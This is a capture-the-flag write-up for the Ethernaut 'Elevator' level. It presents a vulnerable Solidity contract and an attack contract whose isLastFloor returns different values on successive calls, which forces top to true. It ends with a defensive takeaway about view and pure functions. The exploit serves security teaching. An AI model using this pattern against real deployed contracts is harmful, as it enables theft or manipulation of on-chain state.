---
description: what can happen when calling a function externally
---

# 11 - Elevator

Ethernaut Level11: [Elevator](https://ethernaut.openzeppelin.com/level/0x4A151908Da311601D967a6fB9f8cFa5A3E88a251)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}
```

### Goal of this level

* make `top` variable `true`

### What you should know before

* State Mutability\
  \-> see [here](https://docs.soliditylang.org/en/develop/contracts.html#state-mutability)

## Solution

<details>

<summary>Key to solve this problem 🔑</summary>

`goTo` function is not caching the result of calling `isLastFloor` .

Since `isLastF`loor is not a `view` function, \
we can make it return different value each time it is called.

</details>

```solidity
contract AttackElevator is Building {
    bool called;

    function attack(Elevator _instance) external {
        _instance.goTo(1);
    }

    function isLastFloor(uint256) external returns (bool) {
        if(!called) {
            called = true;    
            return false;
        }
        return true;
    }
}
```

```solidity
if (! building.isLastFloor(_floor)) { // building.isLastFloor(_floor) returns false
  floor = _floor;
  top = building.isLastFloor(floor); // building.isLastFloor(floor) returns true
}
```

`isLastFloor` function will return `false` in the first time it is called,\
and it will return `true` after first call.

Deploy the contract and call `attack()` function.

Done! 😎

## Key Takeaways

* To prevent functions from **modyfing states**, declare it as `pure` or `view`.
